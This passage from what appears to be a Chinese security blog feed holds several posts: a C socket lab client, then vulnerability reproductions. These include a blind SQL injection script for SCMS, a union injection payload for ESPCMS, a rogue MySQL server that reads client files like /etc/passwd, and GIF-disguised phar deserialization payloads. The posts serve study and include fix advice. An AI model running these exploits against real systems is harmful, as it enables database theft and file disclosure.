class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;netdb.h&gt;</span><br><span class="line"></span><br><span class="line">#define PORT 8888</span><br><span class="line">#define MAXDATASIZE 100</span><br><span class="line">#define BACKLOG 1</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">int i,fd,numbytes;</span><br><span class="line">char buf[MAXDATASIZE], sendstr[MAXDATASIZE], recstr[MAXDATASIZE];</span><br><span class="line">struct hostent* he;</span><br><span class="line">struct sockaddr_in server,addr;</span><br><span class="line">socklen_t addr_len; </span><br><span class="line">if(argc !=2)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Usage: %s &lt;IP address&gt;\n&quot;, argv[0]);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if((he = gethostbyname(argv[1])) == NULL)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;gethostbyname error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;Create socket failed.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125; </span><br><span class="line">bzero(&amp;server, sizeof(server));</span><br><span class="line">server.sin_family = AF_INET;</span><br><span class="line">server.sin_port = htons(PORT);</span><br><span class="line">server.sin_addr = *((struct in_addr *)he-&gt;h_addr);</span><br><span class="line">if(i=connect(fd,(struct sockaddr *)&amp;server,sizeof(struct sockaddr)) == -1)</span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;connect failed&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//getsockname and getpeername</span><br><span class="line">socklen_t ret = getsockname(fd,(struct sockaddr *)&amp;addr, &amp;addr_len);</span><br><span class="line">    if(ret == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getsockname succ:%s:%d\n&quot;, inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getsockname failed\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    ret = getpeername(fd, (struct sockaddr *)&amp;addr, &amp;addr_len);</span><br><span class="line">    if(ret == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getpeername succ:%s:%d\n&quot;, inet_ntoa(addr.sin_addr), ntohs(addr.sin_port));</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;getpeername failed\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //go </span><br><span class="line">if(((numbytes = recv(fd, buf, MAXDATASIZE, 0)) == -1)) </span><br><span class="line">&#123;</span><br><span class="line">perror(&quot;recv error.&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">buf[numbytes] = &apos;\0&apos;;</span><br><span class="line">printf(&quot;Server Message: %s&quot;,buf);</span><br><span class="line"></span><br><span class="line">//翻转 </span><br><span class="line">while(i!=-1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;Please input a string:&quot;);</span><br><span class="line">scanf(&quot;%s&quot;,sendstr);</span><br><span class="line">if(strcmp(sendstr,&quot;quit&quot;) == 0)</span><br><span class="line">&#123;</span><br><span class="line">write(fd,sendstr,strlen(sendstr)+1);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line">write(fd,sendstr,strlen(sendstr)+1);</span><br><span class="line">read(fd,recstr,MAXDATASIZE);</span><br><span class="line">printf(&quot;%s\n&quot;,recstr);</span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o client2 client2.c</span><br><span class="line">gcc -o server2 server2.c</span><br><span class="line">./client2</span><br><span class="line">./server2</span><br></pre></td></tr></table></figure><p><img src="/img/1568818045072.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/tangxin-blog/p/7348558.html" target="_blank" rel="noopener">getsockname和getpeername的使用</a><br><a href="https://wenku.baidu.com/view/7e972bc14693daef5ef73d75.html?tdsourcetag=s_pctim_aiomsg&amp;qq-pf-to=pcqq.c2c" target="_blank" rel="noopener">tcp字符串翻转</a><br><a href="http://cache.baiducontent.com/c?m=9d78d513d9d430a54f9a91697d1dc012694381132ba1d1020ed58438e3732844506793ac56510773d5d20d6d16d8394beb802102301451b18cc9f85dacc885592a9f2644335bdd0705d368b8bd4032b520875b99b869ecad863884ded1c4a95344cb23120b83e7f82b1764bc78861525a4e6c7474f1956f8ac27648c446a79c17e15a1478eb173385b96f6aa001b853795364addf469a73966b412ae141c2347a451e248177d61be183aa9137b57c9b51cfa20734029b24fb1b8&amp;p=9b6fd415d9c846ed02be9b7c5f51&amp;newp=c357d51985cc43ff57e69365174392695803ed653ad1c44324b9d71fd325001c1b69e7be26241402d3c57e6204ac4e59edf13d78301766dada9fca458ae7c4&amp;user=baidu&amp;fm=sc&amp;query=%C8%E7%B9%FB%D3%C3%BB%A7%CA%E4%C8%EB%B5%C4%CA%C7quit%2C%D4%F2%B9%D8%B1%D5%C1%AC%BD%D3&amp;qid=cb971f3a002ac2d8&amp;p1=6" target="_blank" rel="noopener">tcp套接字编程</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学校最近布置了个套接字实验，挺有意思的，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;题目描述&quot;&gt;&lt;a href=&quot;#题目描述&quot; class=&quot;hea
      
    
    </summary>
    
      <category term="学习" scheme="http://yoursite.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>SCMS接口处存在sql注入漏洞</title>
    <link href="http://yoursite.com/2019/09/18/SCMS%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/09/18/SCMS接口处存在sql注入漏洞/</id>
    <published>2019-09-18T03:55:39.000Z</published>
    <updated>2019-09-18T03:55:39.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>复现一下最近cms的一些cve，学一些技巧套路。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>在/scms/js/scms.php中，第184行-208行中<br>直接获取pageid的值，并将其拼接在where子句中，存在SQL布尔盲注<br><img src="/img/1568778656270.png" alt=""></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>正确返回xxx.jpg<br><img src="/img/1568778786376.png" alt=""><br>错误不返回xxx.jpg<br><img src="/img/1568778809783.png" alt=""><br>编写python脚本注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = &quot;http://127.0.0.1/js/scms.php&quot;;</span><br><span class="line">payload_len = &quot;1\nand\nlength(database())&lt;%d\n#&quot;</span><br><span class="line">payload = &quot;1\nand\nascii(substr(database(),%d,1))&lt;%%d\n#&quot;</span><br><span class="line"></span><br><span class="line">true_str = &quot;20151019102732946.jpg&quot;</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">if flag==1:</span><br><span class="line">list = range(50)</span><br><span class="line">else:</span><br><span class="line">list = range(32,127)</span><br><span class="line">low = 0</span><br><span class="line">high = len(list)-1</span><br><span class="line">while low&lt;=high: </span><br><span class="line">mid = (int)((low+high)/2)</span><br><span class="line">guess = list[mid]</span><br><span class="line">print(list[low],guess,list[high])</span><br><span class="line"># print((payload % guess).replace(&apos; &apos;,&apos;%0A&apos;))</span><br><span class="line">data = &#123;&apos;action&apos;:&apos;jssdk&apos;,&apos;pageid&apos;:(payload % guess).replace(&apos; &apos;,&quot;%0A&quot;),&apos;pagetype&apos;:&apos;text&apos;,&#125;</span><br><span class="line">html = requests.post(url,data).text</span><br><span class="line"># print(html)</span><br><span class="line">if true_str in html:</span><br><span class="line">high = mid - 1</span><br><span class="line">else:</span><br><span class="line">low = mid + 1</span><br><span class="line">if low &gt; high:</span><br><span class="line">return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for l in range(1,length+1):</span><br><span class="line">payload2 = payload % l</span><br><span class="line">result += chr(getOneData(payload2,2))</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;复现一下最近cms的一些cve，学一些技巧套路。&lt;/p&gt;
&lt;h2 id=&quot;原理分析&quot;&gt;&lt;a href=&quot;#原理分析&quot; class=&quot;head
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>ESPCMS代码审计</title>
    <link href="http://yoursite.com/2019/09/17/ESPCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>http://yoursite.com/2019/09/17/ESPCMS代码审计/</id>
    <published>2019-09-17T14:52:04.000Z</published>
    <updated>2019-09-17T14:52:04.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="espcms-p8-后台sql注入"><a href="#espcms-p8-后台sql注入" class="headerlink" title="espcms p8 后台sql注入"></a>espcms p8 后台sql注入</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>在ArticleMain.php，<br>第108行，<code>$search_key</code>通过<code>$_REQUEST</code>全局变量获得。<br>第110行，<code>$search_key</code>经过了一次url解码，这里是漏洞关键点，我们可以通过双重url编码进行绕过全局addslashes过滤，从而进行sql注入。<br>之后<code>$search_key</code>变量拼接到<code>$db_where</code>中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$search_key = urldecode($search_key);</span><br></pre></td></tr></table></figure></p><p><img src="/img/1568390344973.png" alt=""><br>在第114行，需要<code>searchlist</code>参数为false才能继续执行<br><img src="/img/1568391404388.png" alt=""><br>最后$db_where直接被带入SQL语句中执行<br><img src="/img/1568394244172.png" alt=""></p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>后台登录，选择内容管理<br><img src="/img/1568393226496.png" alt=""><br>在最右边有搜索字符串功能，随便输入字符串，通过burpsuit进行抓包<br><img src="/img/1568393324306.png" alt=""><br>通过刚才分析，我们需要将search_key中的内容双重url编码，将searchlist的值设置为false。<br>经过sqlmap提前测试，我们发现document表具有43个字段<br><img src="/img/1568393644250.png" alt=""><br>因此构造payload，为了方便我就查当前数据库版本。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&apos; and 0 union select version(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43#</span><br></pre></td></tr></table></figure></p><p>进行双重url编码，改数据包，可以看到查到数据库当前版本<br><img src="/img/1568393882581.png" alt=""><br>查当前数据库名<br><img src="/img/1568394055486.png" alt=""></p><h3 id="代码缺陷"><a href="#代码缺陷" class="headerlink" title="代码缺陷"></a>代码缺陷</h3><p>通过phpsotrm全局搜索urldecode，可以发现后台多处都有类似的代码对用户传入的搜索字段进行处理，可以用同样的姿势进行sql注入。<br><img src="/img/1568394115713.png" alt=""></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>对urldecode处理后的字符串，进行过滤。</p><h2 id="ESPCMS-P8前台XSS漏洞"><a href="#ESPCMS-P8前台XSS漏洞" class="headerlink" title="ESPCMS P8前台XSS漏洞"></a>ESPCMS P8前台XSS漏洞</h2><h3 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h3><p>在espcms_function.php中，ac和at参数，可以由用户控制，然而并没有进行控制<br><img src="/img/1568731703664.png" alt=""><br>通过该函数获得参数，如果不存在模块，进入报错函数<br><img src="/img/1568731717049.png" alt=""><br>查看该报错函数代码，依然没有过滤，在函数末尾直接输出值。<br><img src="/img/1568731725259.png" alt=""><br>函数末尾<br><img src="/img/1568731732303.png" alt=""></p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><img src="/img/1568731864855.png" alt=""></p><h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><p>对路由参数进行过滤</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;espcms-p8-后台sql注入&quot;&gt;&lt;a href=&quot;#espcms-p8-后台sql注入&quot; class=&quot;headerlink&quot; title=&quot;espcms p8 后台sql注入&quot;&gt;&lt;/a&gt;espcms p8 后台sql注入&lt;/h2&gt;&lt;h3 id=&quot;原理分析&quot;
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>phar+mysql client触发反序列化本地复现</title>
    <link href="http://yoursite.com/2019/09/11/phar+mysql%20client%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/09/11/phar+mysql client触发反序列化本地复现/</id>
    <published>2019-09-11T02:10:47.000Z</published>
    <updated>2019-09-11T02:10:47.291Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>用户请求mysql_client端，client会连接mysql server服务器，mysql server服务器读取<code>phar://phar.gif/test.txt</code>，使得client端执行<code>load client data...</code>的sql语句读取phar文件，触发反序列化。</p><h2 id="mysql-client端脚本"><a href="#mysql-client端脚本" class="headerlink" title="mysql_client端脚本"></a>mysql_client端脚本</h2><p>my_ubuntu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">public function __destruct() &#123;</span><br><span class="line">echo &apos;Destruct called&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$m = mysqli_init();</span><br><span class="line">mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);</span><br><span class="line">$s = mysqli_real_connect($m, &apos;192.168.169.147&apos;, &apos;root&apos;, &apos;root&apos;, &apos;test&apos;, 3306);</span><br><span class="line">$p = mysqli_query($m, &apos;select * from test&apos;);</span><br></pre></td></tr></table></figure></p><h2 id="伪造mysql-server端脚本"><a href="#伪造mysql-server端脚本" class="headerlink" title="伪造mysql_server端脚本"></a>伪造mysql_server端脚本</h2><p>ubuntu16.04 2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding: utf8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">def my_len(s):</span><br><span class="line">    return chr(len(s)+1)</span><br><span class="line"># linux :</span><br><span class="line">#filestring = &quot;/etc/passwd&quot;</span><br><span class="line"># windows:</span><br><span class="line">#filestring = &quot;C:\\Windows\\system32\\drivers\\etc\\hosts&quot;</span><br><span class="line">HOST = &quot;0.0.0.0&quot; # open for eeeeveryone! ^_^</span><br><span class="line">PORT = 3306</span><br><span class="line">BUFFER_SIZE = 1024</span><br><span class="line"></span><br><span class="line">#1 Greeting</span><br><span class="line">greeting = &quot;\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;</span><br><span class="line">#2 Accept all authentications</span><br><span class="line">authok = &quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;</span><br><span class="line"></span><br><span class="line">#3 Payload</span><br><span class="line">#数据包长度</span><br><span class="line">payloadlen = &quot;\x0c&quot;</span><br><span class="line">padding = &quot;\x00\x00&quot;</span><br><span class="line">payload = payloadlen + padding + &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"># print(&quot;payload1:&quot;+payload)</span><br><span class="line">file = raw_input(&quot;file:&quot;)</span><br><span class="line">l = my_len(file) </span><br><span class="line">payload = l + padding + &quot;\x01\xfb&quot; + file</span><br><span class="line"></span><br><span class="line"># &quot;\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line">    print &apos;Connection from:&apos;, addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    while True:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        print &quot; &quot;.join(&quot;%02x&quot; % ord(i) for i in data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        print &quot;[*] Payload send!&quot;</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        if not data: break</span><br><span class="line">        print &quot;Data received:&quot;, data</span><br><span class="line">        break</span><br><span class="line">    # Don&apos;t leave the connection open.</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></p><p>输入<code>phar://phar.gif/test.txt</code>。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;用户请求mysql_client端，client会连接mysql server服务器，mysql server服务器读取&lt;code&gt;phar
      
    
    </summary>
    
      <category term="杂货店" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B4%A7%E5%BA%97/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞</title>
    <link href="http://yoursite.com/2019/09/09/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/09/09/phar反序列化漏洞/</id>
    <published>2019-09-09T09:03:30.000Z</published>
    <updated>2019-09-09T09:03:30.978Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h2><p><strong>1.stub</strong><br>用来标志phar文件，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，必须以<code>__HALT_COMPILER();?&gt;</code>来结尾。<br><strong>2.manifest</strong><br>用来描述phar文件的属性等，其中含有可以由用户自定义的序列化数据<code>meta-data</code>，也是该攻击的核心地方。<br><img src="/img/1568018586208.png" alt=""><br><strong>3.file contents</strong><br>被压缩内容<br><strong>4.signature</strong><br>签名，放在文件末尾</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>需要将php.ini的<code>phar.readonly</code>选项设置为<code>off</code>，才能生成phar文件<br>phar1.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>setMetadata方法直接传入对象即可，后台会自动帮我们序列化。可以看到meta-data以序列化形式存储<br><img src="/img/1568018807153.png" alt=""><br>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：<br><img src="/img/1568018856614.png" alt=""><br>通过demo测试一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    class TestObject &#123;</span><br><span class="line">        public function __destruct() &#123;</span><br><span class="line">            echo &apos;Destruct called&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = &apos;phar://phar.phar/test.txt&apos;;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/img/1568019777929.png" alt=""></p><h2 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&quot;phar.phar&quot;);</span><br><span class="line">$phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot; . &quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头</span><br><span class="line">$o = new TestObject();</span><br><span class="line">$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>再改后缀名gif，就伪造成gif图片，并且依然可以成功反序列化<br><img src="/img/1568019789974.png" alt=""></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.phar文件能够上传到服务器端<br>2.文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特色字符没有被过滤</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;phar文件结构&quot;&gt;&lt;a href=&quot;#phar文件结构&quot; class=&quot;headerlink&quot; title=&quot;phar文件结构&quot;&gt;&lt;/a&gt;phar文件结构&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1.stub&lt;/strong&gt;&lt;br&gt;用来标志phar文件，格式为&lt;code
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>PHP利用PCRE回溯绕过正则表达式</title>
